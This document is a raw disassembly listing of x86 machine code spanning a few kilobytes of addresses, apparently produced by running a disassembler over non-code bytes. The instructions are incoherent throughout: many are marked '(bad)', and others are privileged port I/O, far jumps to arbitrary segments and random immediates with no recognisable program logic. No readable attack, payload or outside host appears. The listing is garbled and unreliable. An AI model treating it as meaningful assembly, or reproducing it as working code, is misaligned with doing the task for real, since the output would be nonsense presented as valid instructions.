  423528:	mov    ebp,0x8619b31b
  42352d:	in     eax,0x7f
  42352f:	adc    al,0x2c
  423531:	popf   
  423532:	xor    DWORD PTR [ebp-0x14],edx
  423535:	cmp    al,0xd3
  423537:	loopne 0x4234bd
  423539:	or     al,cl
  42353b:	sbb    ch,BYTE PTR [esi]
  42353d:	cwde   
  42353e:	out    0x0,al
  423540:	adc    DWORD PTR [eax+0x7],0xc778bb14
  423547:	pop    esi
  423548:	jg     0x423575
  42354a:	(bad)  
  42354b:	push   ecx
  42354c:	test   eax,0x17e17ea0
  423551:	repnz mov ah,0xb4
  423554:	imul   edi,eax,0x7
  423557:	cld    
  423558:	dec    eax
  423559:	retf   
  42355a:	pop    DWORD PTR [ecx]
  42355c:	adc    al,0x6c
  42355e:	mov    esi,ds
  423560:	dec    esp
  423561:	fisttp QWORD PTR [ebp+edi*8-0x57]
  423565:	push   ds
  423566:	sub    ch,BYTE PTR [ecx+0x13]
  423569:	inc    ebp
  42356a:	imul   ecx,DWORD PTR [ebp-0x3b9bdccd],0xb5b61500
  423574:	xlat   BYTE PTR ds:[ebx]
  423575:	dec    ebx
  423576:	and    DWORD PTR [esi+0x5c],esp
  423579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42357a:	(bad)  
  42357b:	ror    DWORD PTR [edx],1
  42357d:	add    DWORD PTR [esi+0x3b422df2],ebx
  423583:	jle    0x423578
  423585:	cdq    
  423586:	mov    BYTE PTR [edi],0x9d
  423589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42358a:	imul   edx,edi,0xfffffff7
  42358d:	std    
  42358e:	fist   WORD PTR [edx+0x6]
  423591:	ins    DWORD PTR es:[edi],dx
  423592:	sti    
  423593:	add    cl,BYTE PTR [edx-0x635d1d8d]
  423599:	daa    
  42359a:	call   0x5ac6:0x44dd37e9
  4235a1:	pop    esi
  4235a2:	and    cl,dh
  4235a4:	xchg   ebp,eax
  4235a5:	inc    esp
  4235a6:	(bad)  
  4235a7:	ret    0xcccc
  4235aa:	shr    BYTE PTR [esi-0x3e83e13c],0x29
  4235b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b2:	sub    dh,BYTE PTR [esi+esi*4-0x11c257d3]
  4235b9:	push   0x2f
  4235bb:	pavgw  xmm0,XMMWORD PTR [edx+0x7c557f41]
  4235c3:	mov    esi,0xcf55d9a3
  4235c8:	mov    ah,0x4d
  4235ca:	xor    BYTE PTR [ecx],ch
  4235cc:	mov    BYTE PTR [ecx],ch
  4235ce:	xor    BYTE PTR [ecx],0xa2
  4235d1:	lock jnp 0x4235a4
  4235d4:	dec    edx
  4235d5:	fwait
  4235d6:	rol    DWORD PTR [ecx-0x2e1af29],1
  4235dc:	inc    edi
  4235dd:	pop    edi
  4235de:	jmp    0x42358a
  4235e0:	mov    ds:0xc774eeb6,eax
  4235e5:	sbb    eax,0xc56fd2e8
  4235ea:	jmp    0x42365a
  4235ec:	add    DWORD PTR [edi-0x4b817c49],esp
  4235f2:	add    al,cl
  4235f4:	xchg   eax,ebp
  4235f6:	and    eax,0x72a86c4e
  4235fb:	pop    ebx
  4235fc:	sub    al,0x6a
  4235fe:	pop    eax
  4235ff:	mov    esp,0xd808dd2b
  423604:	out    0x6c,al
  423606:	and    al,BYTE PTR [ebx]
  423608:	add    eax,0x686f1750
  42360d:	mov    al,0xc6
  42360f:	les    eax,FWORD PTR [ebx+0x34]
  423612:	push   0x1cf85749
  423617:	int3   
  423618:	lahf   
  423619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42361a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42361b:	or     bl,dl
  42361d:	mov    bh,0x98
  42361f:	out    dx,al
  423620:	ret    
  423621:	xchg   BYTE PTR [eax-0x4a],dl
  423624:	or     al,0x3e
  423626:	cmp    BYTE PTR [esi],bl
  423628:	jbe    0x4235e1
  42362a:	aaa    
  42362b:	(bad)  
  42362c:	mov    edi,0x4d65f757
  423631:	gs jne 0x423656
  423634:	mov    cs,WORD PTR [ecx+0x45]
  423637:	mov    WORD PTR [edx+eiz*8-0x579e9b47],?
  42363e:	add    eax,0x83cdb7d3
  423643:	int3   
  423644:	pop    edi
  423645:	xchg   DWORD PTR [esi+0x5c],edx
  423648:	xor    BYTE PTR [bp-0x112d],bh
  42364d:	xchg   edx,eax
  42364e:	xchg   edx,eax
  42364f:	pop    esi
  423650:	imul   ecx,DWORD PTR [eax],0xffffffe6
  423653:	add    DWORD PTR [edx+0x31f48765],edx
  423659:	sbb    eax,0x83ab88b4
  42365e:	arpl   WORD PTR [ebx],bx
  423660:	inc    ecx
  423661:	push   esp
  423662:	pop    ebp
  423663:	popf   
  423664:	int    0xa1
  423666:	imul   ebp,DWORD PTR [edx],0x64963fb6
  42366c:	add    DWORD PTR [ebp-0x5f],ebx
  42366f:	dec    ebp
  423670:	inc    ecx
  423671:	push   eax
  423672:	inc    eax
  423673:	cld    
  423674:	les    ebp,FWORD PTR [ebx]
  423676:	push   ebp
  423677:	inc    esp
  423678:	std    
  423679:	fwait
  42367a:	gs pop ebp
  42367c:	repz and ch,ch
  42367f:	cs fwait
  423681:	jmp    0x4236b9
  423683:	ss clc 
  423685:	xchg   ebx,eax
  423686:	mov    ebx,0x58849f61
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x37a42923
  423697:	in     eax,dx
  423698:	jne    0x4236a9
  42369a:	sub    ch,al
  42369c:	add    DWORD PTR [eax],eax
  42369e:	mov    BYTE PTR [esi],al
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	sahf   
  4236a3:	inc    edi
  4236a4:	cld    
  4236a5:	add    bh,BYTE PTR es:[eax-0x39]
  4236a9:	add    BYTE PTR [ecx],ah
  4236ab:	mov    esi,0x79d41166
  4236b0:	jmp    0xe9ff50b1
  4236b5:	jmp    0x6270e3c3
  4236ba:	jle    0x423739
  4236bc:	cmp    DWORD PTR fs:[ebx+0x77],0xffffffad
  4236c1:	dec    edi
  4236c2:	jg     0x4236df
  4236c4:	sbb    edi,ebp
  4236c6:	data16 std 
  4236c8:	inc    cx
  4236ca:	int3   
  4236cb:	sub    eax,0xce87a223
  4236d0:	sbb    al,0xdd
  4236d2:	mov    dh,0x2f
  4236d4:	int    0x36
  4236d6:	int    0xf7
  4236d8:	mov    dl,0xf2
  4236da:	and    ah,BYTE PTR [ebx+0x72f3458b]
  4236e0:	mov    ch,0x64
  4236e2:	mov    eax,ds:0x7117f4a2
  4236e7:	mov    esp,ecx
  4236e9:	add    edx,edx
  4236eb:	(bad)  
  4236ec:	dec    eax
  4236ed:	and    BYTE PTR [esi+esi*1],bl
  4236f0:	xor    al,0xe7
  4236f2:	sbb    al,0x4a
  4236f4:	pop    esp
  4236f5:	mov    al,0xa7
  4236f7:	cmp    al,0x3d
  4236f9:	mov    edi,0x8a728820
  4236fe:	leave  
  4236ff:	cmc    
  423700:	xor    BYTE PTR [edx+0x5cea54c4],ch
  423706:	mov    DWORD PTR [edx+0x5dd5100c],ebp
  42370c:	and    bh,bl
  42370e:	aam    0xa0
  423710:	pushf  
  423711:	out    0x2,eax
  423713:	sbb    eax,0x8175d583
  423718:	xor    eax,0xad77dc97
  42371d:	out    dx,eax
  42371e:	mov    ebp,0x7c60e1ee
  423723:	xchg   edx,eax
  423724:	mov    BYTE PTR [edx],dl
  423726:	sub    DWORD PTR [ebx-0x4],esp
  423729:	sbb    DWORD PTR ds:0xdbf3c28c,esi
  42372f:	mov    bh,BYTE PTR [ebx-0x58fefe01]
  423735:	cdq    
  423736:	add    al,0x39
  423738:	(bad)  
  423739:	push   ebx
  42373a:	mov    BYTE PTR [ecx],dh
  42373c:	dec    edi
  42373d:	pop    eax
  42373e:	inc    edx
  42373f:	dec    ecx
  423740:	sub    DWORD PTR [ecx-0x6a1f6992],ebx
  423746:	cmp    eax,0xa74e8ec8
  42374b:	retf   
  42374c:	push   ebp
  42374d:	pop    edi
  42374e:	dec    eax
  42374f:	mov    ds:0xf875207,al
  423754:	xor    BYTE PTR [ebp-0x9fd5546],cl
  42375a:	fs popf 
  42375c:	mov    ecx,0xe348bd34
  423761:	mov    al,0x4
  423763:	dec    esi
  423764:	lods   al,BYTE PTR ds:[esi]
  423765:	jle    0x4237cf
  423767:	jg     0x42375f
  423769:	xchg   edx,edi
  42376b:	and    ebx,DWORD PTR [edx+0x68454355]
  423771:	mov    bh,0x8d
  423773:	not    DWORD PTR [edi-0x78e0c4df]
  423779:	inc    edx
  42377a:	rol    DWORD PTR [edx],0x71
  42377d:	ins    DWORD PTR es:[edi],dx
  42377e:	inc    edx
  42377f:	jmp    0xa098:0xf05b0d89
  423786:	es cmp al,0x5d
  423789:	ror    BYTE PTR [edx-0x57],cl
  42378c:	pop    esi
  42378d:	and    al,0xb5
  42378f:	adc    eax,0x77cf7f42
  423794:	js     0x423813
  423796:	dec    esi
  423797:	push   edi
  423798:	arpl   WORD PTR [edi],sp
  42379a:	aaa    
  42379b:	add    BYTE PTR [ebp+0x5d77ddd1],bh
  4237a1:	xchg   edx,eax
  4237a2:	out    dx,eax
  4237a3:	add    DWORD PTR [eax-0x2b413fc],ebp
  4237a9:	xchg   ecx,eax
  4237aa:	inc    ecx
  4237ab:	sbb    ah,al
  4237ad:	rcr    DWORD PTR [edx-0x71d04642],1
  4237b3:	xchg   cl,al
  4237b5:	add    ebp,edi
  4237b7:	or     al,0x49
  4237b9:	sahf   
  4237ba:	addr16 test eax,0xd74e244d
  4237c0:	mov    dl,0xb4
  4237c2:	(bad)  
  4237c3:	leave  
  4237c4:	sti    
  4237c5:	adc    dl,cl
  4237c7:	mov    eax,ds:0x11fba954
  4237cc:	cli    
  4237cd:	test   al,0xe0
  4237cf:	or     al,0x59
  4237d1:	aas    
  4237d2:	jmp    0x423802
  4237d4:	adc    al,0x6
  4237d6:	scas   al,BYTE PTR es:[edi]
  4237d7:	lock push 0x52db5f57
  4237dd:	pop    ecx
  4237de:	dec    esp
  4237df:	(bad)  
  4237e0:	loop   0x4237b2
  4237e2:	test   BYTE PTR [esp+esi*4],dh
  4237e5:	fild   WORD PTR [edx+0x42a24736]
  4237eb:	xchg   esi,eax
  4237ec:	push   ebp
  4237ed:	xor    eax,0x3c536a04
  4237f2:	ins    DWORD PTR es:[edi],dx
  4237f3:	xlat   BYTE PTR ds:[ebx]
  4237f4:	or     edx,DWORD PTR [edi-0x6b]
  4237f7:	xchg   BYTE PTR [ecx+0x39ce0fdd],dl
  4237fd:	add    BYTE PTR [ebp+0x71],bh
  423800:	aad    0x11
  423802:	cld    
  423803:	shl    DWORD PTR ds:0xb83254da,cl
  423809:	and    BYTE PTR [ebx],0x6
  42380c:	dec    BYTE PTR [ecx+ebx*8]
  42380f:	ins    BYTE PTR es:[edi],dx
  423810:	aam    0x9a
  423812:	nop
  423813:	call   0xc01cab94
  423818:	popa   
  423819:	ss jmp 0x423803
  42381c:	adc    esp,DWORD PTR [esi-0x33]
  42381f:	test   DWORD PTR [eax-0x39],eax
  423822:	inc    ebx
  423823:	cld    
  423824:	popfw  
  423826:	ss mov ebx,0x700ea259
  42382c:	jmp    0x6280:0x6c7462b3
  423833:	dec    eax
  423834:	aas    
  423835:	sar    dh,cl
  423837:	ja     0x4238ab
  423839:	and    al,0x6b
  42383b:	mov    ebp,0xc6564ee
  423840:	mov    al,0x6
  423842:	push   esi
  423843:	adc    al,0xdf
  423845:	dec    ebp
  423846:	gs sbb dl,bh
  423849:	mov    al,0x4e
  42384b:	repz iret 
  42384d:	cmp    DWORD PTR [esi],ebp
  42384f:	xor    BYTE PTR [edx+0xd4220da],cl
  423855:	xlat   BYTE PTR ds:[ebx]
  423856:	add    ebx,ecx
  423858:	ins    BYTE PTR es:[edi],dx
  423859:	outs   dx,BYTE PTR ds:[esi]
  42385a:	xchg   DWORD PTR [eax],esp
  42385c:	leave  
  42385d:	je     0x4237f0
  42385f:	jne    0x4238e0
  423861:	(bad)  
  423862:	in     eax,0xc7
  423864:	inc    edx
  423865:	xor    BYTE PTR [esi],ah
  423867:	sbb    dl,ch
  423869:	jns    0x42388e
  42386b:	lahf   
  42386c:	clc    
  42386d:	inc    edx
  42386e:	setl   ch
  423871:	(bad)  
  423872:	mov    cl,0x40
  423874:	cld    
  423875:	pop    esp
  423876:	dec    ebx
  423877:	push   cs
  423878:	ret    0xbafe
  42387b:	jecxz  0x423808
  42387d:	rcr    DWORD PTR [edi],0x4a
  423880:	inc    esi
  423881:	push   es
  423882:	out    0x17,al
  423884:	retf   
  423885:	cmp    DWORD PTR [ecx],eax
  423887:	ror    bh,cl
  423889:	adc    bh,cl
  42388b:	(bad)  
  42388c:	(bad)  
  42388d:	xchg   edx,eax
  42388e:	pop    esp
  42388f:	fnstsw ax
  423891:	push   edi
  423892:	shl    BYTE PTR [ebp+0x7e51693d],0x83
  423899:	mov    BYTE PTR [ecx+0x233fd413],bh
  42389f:	fbstp  TBYTE PTR [ecx+0xe5d1bd8]
  4238a5:	xchg   edx,eax
  4238a6:	mov    ds:0xd13d0ecb,eax
  4238ab:	out    dx,eax
  4238ac:	or     ch,BYTE PTR [ebx+0x6c239acd]
  4238b2:	add    al,0xed
  4238b4:	loope  0x4238cb
  4238b6:	imul   ecx,DWORD PTR [esi],0x1fa1b39
  4238bc:	gs clc 
  4238be:	or     al,0xa2
  4238c0:	jmp    0xad4d:0xa779d1c3
  4238c7:	or     al,0x16
  4238c9:	mov    WORD PTR [esi],?
  4238cb:	nop
  4238cc:	push   ds
  4238cd:	mov    ebx,0x3a750197
  4238d2:	and    al,0x87
  4238d4:	loop   0x423904
  4238d6:	jb     0x423900
  4238d8:	mov    bh,0xef
  4238da:	ret    0xad
  4238dd:	daa    
  4238de:	mov    BYTE PTR [ebx-0xf7cbaf2],dl
  4238e4:	mov    ds:0x393bb69b,eax
  4238e9:	add    al,0x8f
  4238eb:	sub    esp,ebp
  4238ed:	add    al,0xc0
  4238ef:	jno    0x4238b8
  4238f1:	adc    DWORD PTR [ecx+0x48fb5a9d],esi
  4238f7:	mov    bl,0x4f
  4238f9:	xchg   esi,eax
  4238fa:	inc    edx
  4238fb:	push   esp
  4238fc:	imul   edi,DWORD PTR [eax+0x48],0x6413698c
  423903:	fsubrp st(7),st
  423905:	mov    bl,0x4c
  423907:	imul   ebx,DWORD PTR [edi],0xe1f1ada8
  42390d:	call   0xd2af:0x6decc847
  423914:	sbb    al,0x9b
  423916:	fwait
  423917:	les    ebx,FWORD PTR [edi+0x43e1cd44]
  42391d:	jne    0x42399e
  42391f:	outs   dx,BYTE PTR ds:[esi]
  423920:	iret   
  423921:	inc    edx
  423922:	add    ebx,DWORD PTR [ebx]
  423924:	jmp    0xd69a5013
  423929:	icebp  
  42392a:	jmp    0x4238b8
  42392c:	test   DWORD PTR [eax+ebp*2],0x4fdda5a7
  423933:	ficom  DWORD PTR [edi-0x24]
  423936:	pop    eax
  423937:	push   es
  423938:	mov    eax,0x6f0c584
  42393d:	cwde   
  42393e:	mov    ebx,0xd3c6a10
  423943:	inc    eax
  423944:	add    al,0x1d
  423946:	push   esi
  423947:	cmp    BYTE PTR [ecx+eiz*4],0xb2
  42394b:	sbb    ch,dh
  42394d:	icebp  
  42394e:	jge    0x4239a5
  423950:	and    dl,bl
  423952:	outs   dx,BYTE PTR ds:[esi]
  423953:	mov    dl,0x9
  423955:	pop    es
  423956:	xchg   ebx,eax
  423957:	out    dx,al
  423958:	add    al,BYTE PTR [eax-0x4b256cbc]
  42395e:	mov    edi,0x4c69551e
  423963:	mov    edx,0xdf807912
  423968:	popf   
  423969:	ins    DWORD PTR es:[edi],dx
  42396a:	les    esi,FWORD PTR [ebp+0x61aae0d9]
  423970:	pusha  
  423971:	ds mov ebx,0xfe273e34
  423977:	rol    BYTE PTR [ebp+0x54fac7f4],0x40
  42397e:	rcr    DWORD PTR [eax+0x525397cd],cl
  423984:	mov    BYTE PTR [edi],0xb2
  423987:	fcomp  DWORD PTR [edx]
  423989:	pop    esp
  42398a:	pop    esi
  42398b:	pushf  
  42398c:	repnz (bad) 
  42398e:	inc    esi
  42398f:	call   0xd14c64f5
  423994:	(bad)  
  423995:	les    ecx,FWORD PTR [ebp-0x151c9692]
  42399b:	mov    dl,0x82
  42399d:	lock (bad) 
  42399f:	(bad)  [esi+0x23d6fb22]
  4239a5:	mov    ds:0xa0fc7afe,eax
  4239aa:	mov    ch,0x42
  4239ac:	or     eax,0x7a0a9c71
  4239b1:	mov    esp,0xfc3240d4
  4239b6:	cmp    DWORD PTR [edi-0x7c],ebx
  4239b9:	jmp    0x423998
  4239bb:	repnz arpl WORD PTR [esi],dx
  4239be:	xchg   esp,eax
  4239bf:	lea    esi,[esi-0x23ddda3c]
  4239c5:	mov    WORD PTR [ebx+0xe],gs
  4239c8:	mov    ah,0xc4
  4239ca:	rcr    BYTE PTR [esi],cl
  4239cc:	test   eax,0xdb24aa15
  4239d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239d2:	aaa    
  4239d3:	mov    ch,al
  4239d5:	and    al,0x6c
  4239d7:	push   0x48
  4239d9:	sbb    eax,0xebe1f19
  4239de:	inc    ebp
  4239df:	sbb    eax,0xd6bae18c
  4239e4:	dec    BYTE PTR [ebx-0x7]
  4239e7:	jb     0x4239a6
  4239e9:	rcr    DWORD PTR [eax-0x71ed0f1f],1
  4239ef:	shl    DWORD PTR [eax-0x15],cl
  4239f2:	ficomp WORD PTR ss:[ebx]
  4239f5:	dec    ecx
  4239f6:	rol    DWORD PTR [eax],0x19
  4239f9:	sub    bl,BYTE PTR [ebx-0x5729b1cc]
  4239ff:	dec    esi
  423a00:	sbb    eax,0xf42c2f5e
  423a05:	jge    0x423a25
  423a07:	inc    edi
  423a08:	push   ebx
  423a09:	div    DWORD PTR [edi-0x42ea4e5a]
  423a0f:	popa   
  423a10:	jecxz  0x423a00
  423a12:	in     eax,dx
  423a13:	sub    ebx,eax
  423a15:	mov    bl,0xdb
  423a17:	mov    bl,0x11
  423a19:	push   ebp
  423a1a:	pop    ebp
  423a1b:	or     DWORD PTR [edi-0x4bfaede0],esp
  423a21:	xchg   edi,eax
  423a22:	arpl   WORD PTR [eax+0x5b],ax
  423a25:	shl    edx,1
  423a27:	xchg   esi,eax
  423a28:	test   eax,0x797a8fbd
  423a2d:	imul   ecx,DWORD PTR [ebx+0x65cc7f5b],0x6b
  423a34:	icebp  
  423a35:	dec    ebx
  423a36:	adc    esi,DWORD PTR [ecx]
  423a38:	imul   edx,edi,0x5b
  423a3b:	xchg   esp,eax
  423a3c:	out    dx,eax
  423a3d:	mov    dh,0x6e
  423a3f:	jp     0x4239f7
  423a41:	xchg   edi,eax
  423a42:	pop    esp
  423a43:	inc    eax
  423a44:	cwde   
  423a45:	daa    
  423a46:	inc    ebp
  423a47:	xchg   esi,eax
  423a48:	pop    eax
  423a49:	add    eax,0xdb2b714c
  423a4e:	or     al,0x38
  423a50:	rcr    dh,0x9
  423a53:	ret    
  423a54:	push   esi
  423a55:	pop    ebx
  423a56:	cmp    eax,0x41c88e3f
  423a5b:	mov    edi,0xded1195c
  423a60:	adc    edx,DWORD PTR [edx-0x45]
  423a63:	fcmovnu st,st(1)
  423a65:	pop    ebp
  423a66:	sub    eax,0x4d3e2670
  423a6b:	out    0x7,al
  423a6d:	sbb    BYTE PTR [eax-0x7c96f3ef],al
  423a73:	es push ebp
  423a75:	in     al,0x87
  423a77:	sub    edi,DWORD PTR [esi]
  423a79:	push   edi
  423a7a:	fstp   st(7)
  423a7c:	add    eax,0x712d682d
  423a81:	sbb    al,0x84
  423a83:	mov    eax,ds:0x88a71eff
  423a88:	lea    ebx,[edi+0x4]
  423a8b:	pop    ss
  423a8c:	clc    
  423a8d:	mov    ecx,0x93b3fed6
  423a92:	je     0x423aac
  423a94:	add    eax,0x7df02b52
  423a99:	in     eax,dx
  423a9a:	lds    ebx,FWORD PTR [ecx]
  423a9c:	imul   DWORD PTR [ebp-0x42]
  423a9f:	sbb    al,0x92
  423aa1:	ins    BYTE PTR es:[edi],dx
  423aa2:	jbe    0x423a97
  423aa4:	sbb    BYTE PTR [eax],bl
  423aa6:	dec    edi
  423aa7:	fwait
  423aa8:	imul   esi,DWORD PTR [ecx],0x97573a7d
  423aae:	and    bl,BYTE PTR [esi]
  423ab0:	adc    ch,0xb0
  423ab3:	add    al,0x9c
  423ab5:	aaa    
  423ab6:	lods   al,BYTE PTR ds:[esi]
  423ab7:	adc    DWORD PTR [esi-0x5e],edi
  423aba:	xchg   ecx,eax
  423abb:	jp     0x423a89
  423abd:	sbb    cl,cl
  423abf:	push   esi
  423ac0:	into   
  423ac1:	leave  
  423ac2:	scas   eax,DWORD PTR es:[edi]
  423ac3:	jb     0x423a6d
  423ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ac6:	aam    0x2
  423ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ac9:	jns    0x423b25
  423acb:	hlt    
  423acc:	jg     0x423abf
  423ace:	mov    cl,0xf5
  423ad0:	xchg   ebx,eax
  423ad1:	ja     0x423a76
  423ad3:	fstp   QWORD PTR [edx]
  423ad5:	or     al,0xc1
  423ad7:	pop    esi
  423ad8:	mov    al,ds:0xbf1799fc
  423add:	mov    WORD PTR [ebp+eax*4+0x6df821f4],gs
  423ae4:	(bad)  
  423ae5:	push   ebx
  423ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ae7:	add    al,0x83
  423ae9:	ss loop 0x423b57
  423aec:	icebp  
  423aed:	push   edx
  423aee:	sub    DWORD PTR [edi+0x72],ecx
  423af1:	xchg   ebp,eax
  423af2:	or     DWORD PTR [edi-0x62f76a84],0x24
  423af9:	dec    esi
  423afa:	arpl   di,ax
  423afc:	push   eax
  423afd:	dec    ecx
  423afe:	in     eax,dx
  423aff:	dec    esi
  423b00:	xor    al,0xba
  423b02:	pop    edx
  423b03:	sar    DWORD PTR [edx],1
  423b05:	xlat   BYTE PTR ds:[ebx]
  423b06:	jmp    0x65c27448
  423b0b:	int    0x8b
  423b0d:	sahf   
  423b0e:	xor    al,BYTE PTR [eax-0xe]
  423b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b12:	xchg   DWORD PTR [edi],ebx
  423b14:	daa    
  423b15:	add    eax,0x74538f9b
  423b1a:	mov    BYTE PTR [ecx-0x7269704e],dl
  423b20:	dec    ebp
  423b21:	sub    BYTE PTR [esi-0x72],dh
  423b24:	add    bl,dl
  423b26:	and    eax,0xbad1bacd
  423b2b:	mov    bh,0x78
  423b2d:	or     eax,0x1a0dbb38
  423b32:	or     al,0xad
  423b34:	imul   DWORD PTR [edx+0x25]
  423b37:	dec    esp
  423b38:	aaa    
  423b39:	imul   esi,ebx,0xffffffc2
  423b3c:	and    BYTE PTR [esi+0xf],ah
  423b3f:	jne    0x423ac1
  423b41:	cmp    eax,0x21a32db6
  423b46:	pop    es
  423b47:	pop    ebx
  423b48:	das    
  423b49:	out    0xf9,al
  423b4b:	pop    edi
  423b4c:	adc    bl,BYTE PTR [edi-0x5b]
  423b4f:	fnstcw WORD PTR [edi-0x1]
  423b52:	es jae 0x423b22
  423b55:	mov    eax,0xd9a42963
  423b5a:	sub    BYTE PTR [eax],al
  423b5c:	(bad)  
  423b5d:	outs   dx,BYTE PTR ds:[esi]
  423b5e:	and    cl,bl
  423b60:	sub    bl,BYTE PTR [eax+0x33]
  423b63:	mov    al,0xf3
  423b65:	sahf   
  423b66:	lock jbe 0x423b2f
  423b69:	pop    ebp
  423b6a:	mov    bl,bl
  423b6c:	or     DWORD PTR [eax+ecx*1-0x4d],ebx
  423b70:	(bad)  [esi]
  423b72:	xor    bh,BYTE PTR [esi+0x5b]
  423b75:	push   ebx
  423b76:	xchg   ebx,eax
  423b77:	mov    WORD PTR [esi+0x7a],ds
  423b7a:	mov    edi,ecx
  423b7c:	mov    gs,WORD PTR [esi]
  423b7e:	xor    BYTE PTR ds:0xc26176e0,ch
  423b84:	test   BYTE PTR [ecx],cl
  423b86:	leave  
  423b87:	mov    bh,0xa9
  423b89:	repz add al,BYTE PTR [esi-0x534c4cc6]
  423b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b91:	fs mov ebp,0x94df2c55
  423b97:	and    BYTE PTR [ebp+0x79],ch
  423b9a:	xor    eax,0x62f614ad
  423b9f:	je     0x423bc6
  423ba1:	enter  0xd71a,0xff
  423ba5:	adc    al,0xfe
  423ba7:	cmp    edx,ebx
  423ba9:	iret   
  423baa:	daa    
  423bab:	dec    edx
  423bac:	or     dl,BYTE PTR [ebx-0x2]
  423baf:	mov    dl,BYTE PTR [ebx]
  423bb1:	lods   eax,DWORD PTR ds:[esi]
  423bb2:	popa   
  423bb3:	push   0xffffffae
  423bb5:	mov    ah,0xec
  423bb7:	test   DWORD PTR [edx],ebp
  423bb9:	in     eax,dx
  423bba:	mov    esi,0xe2163821
  423bbf:	(bad)  
  423bc0:	out    dx,eax
  423bc1:	mov    cl,0x30
  423bc3:	vpunpckldq xmm5,xmm3,XMMWORD PTR [ebx+0x79cac3a2]
  423bcb:	loop   0x423c3e
  423bcd:	jmp    0x1d2e:0x4c0d58ce
  423bd4:	mov    ah,0x8a
  423bd6:	mov    eax,ds:0x13df9664
  423bdb:	not    edi
  423bdd:	and    ebp,DWORD PTR [ebx]
  423bdf:	leave  
  423be0:	sub    edx,esi
  423be2:	pop    edx
  423be3:	pop    ebp
  423be4:	sbb    ecx,ebx
  423be6:	or     al,0x2a
  423be8:	mov    dl,cl
  423bea:	dec    esp
  423beb:	mov    ch,0xaa
  423bed:	in     al,dx
  423bee:	out    dx,eax
  423bef:	lock add al,al
  423bf2:	mov    ebx,0x98487d99
  423bf7:	and    dl,BYTE PTR [ebp-0x29]
  423bfa:	fdiv   st(2),st
  423bfc:	and    DWORD PTR [eax+0x32],0xffffffe3
  423c00:	(bad)  
  423c01:	shl    BYTE PTR [esp+edx*4],1
  423c04:	mov    BYTE PTR [eax],bh
  423c06:	inc    edx
  423c07:	xor    al,ah
  423c09:	dec    ecx
  423c0a:	push   ebx
  423c0b:	pop    es
  423c0c:	pop    ebx
  423c0d:	sahf   
  423c0e:	dec    edx
  423c0f:	cmp    BYTE PTR [ecx+0x6694948a],dh
  423c15:	cmc    
  423c16:	mov    edx,0xd1e7bcba
  423c1b:	(bad)  
  423c1c:	push   esp
  423c1d:	int3   
  423c1e:	pushf  
  423c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c20:	test   eax,0x44136fb3
  423c25:	stos   DWORD PTR es:[edi],eax
  423c26:	push   edx
  423c27:	push   ebx
  423c28:	mov    edx,0xe3a98413
  423c2d:	sbb    al,0xd5
  423c2f:	sbb    DWORD PTR [ecx+0x4b835f67],eax
  423c35:	or     BYTE PTR [ecx-0x27],dh
  423c38:	js     0x423c10
  423c3a:	or     al,0x78
  423c3c:	cwde   
  423c3d:	sahf   
  423c3e:	push   esi
  423c3f:	mov    edx,0x424b8b61
  423c44:	mov    ah,0x12
  423c46:	xchg   BYTE PTR ds:0x87000d68,cl
  423c4c:	and    BYTE PTR [edx+0x53993215],0xdb
  423c53:	inc    edi
  423c54:	jl     0x423caa
  423c56:	pop    edi
  423c57:	push   edx
  423c58:	or     BYTE PTR [edx-0x4891a768],ah
  423c5e:	push   eax
  423c5f:	mov    cl,0x54
  423c61:	data16 cs ds test al,0x93
  423c66:	pop    ebx
  423c67:	jmp    0x28f8:0x5b30b875
  423c6e:	or     edi,esp
  423c70:	pop    esi
  423c71:	sbb    DWORD PTR [eax],0xde318168
  423c77:	aam    0xd7
  423c79:	call   0x3be8:0x38891e55
  423c80:	push   0xffffffc0
  423c82:	pushf  
  423c83:	sub    eax,DWORD PTR [edx+esi*8+0x57]
  423c87:	in     eax,0x84
  423c89:	push   ss
  423c8a:	or     DWORD PTR [eax],0xfffffffe
  423c8d:	out    dx,eax
  423c8e:	cmc    
  423c8f:	cmp    BYTE PTR [ebx-0x36c5943c],bh
  423c95:	out    0xd5,eax
  423c97:	sbb    eax,0xfd38a2d2
  423c9c:	xchg   esp,eax
  423c9d:	push   esi
  423c9e:	mov    ebx,0x7ab4c4c4
  423ca3:	retf   
  423ca4:	stc    
  423ca5:	xor    al,0x6d
  423ca7:	or     al,0xd0
  423ca9:	jg     0x423c49
  423cab:	jnp    0x423cb0
  423cad:	push   ebp
  423cae:	cli    
  423caf:	jge    0x423cd7
  423cb1:	data16 ja 0x423cf3
  423cb4:	in     eax,dx
  423cb5:	mov    ds:0xa0c23d05,al
  423cba:	(bad)  
  423cbb:	into   
  423cbc:	jg     0x423cda
  423cbe:	sub    ebp,edi
  423cc0:	mov    esi,0x6c2b3d3e
  423cc5:	jmp    0xde58:0x9a31df04
  423ccc:	into   
  423ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cce:	fcom   QWORD PTR [ecx-0x63]
  423cd1:	mov    ebx,0xf47286c0
  423cd6:	mov    esp,0xedac3506
  423cdb:	lods   al,BYTE PTR ds:[esi]
  423cdc:	pop    ss
  423cdd:	xchg   dl,dh
  423cdf:	xchg   BYTE PTR ds:0x31d87366,bh
  423ce5:	adc    BYTE PTR [eax],dl
  423ce7:	jo     0x423d23
  423ce9:	jo     0x423d22
  423ceb:	mov    ebp,0x4872eb9
  423cf0:	mov    ds:0xb35b6ae2,eax
  423cf5:	xchg   dl,ah
  423cf7:	dec    ebp
  423cf8:	cmp    esp,DWORD PTR [ecx-0x34]
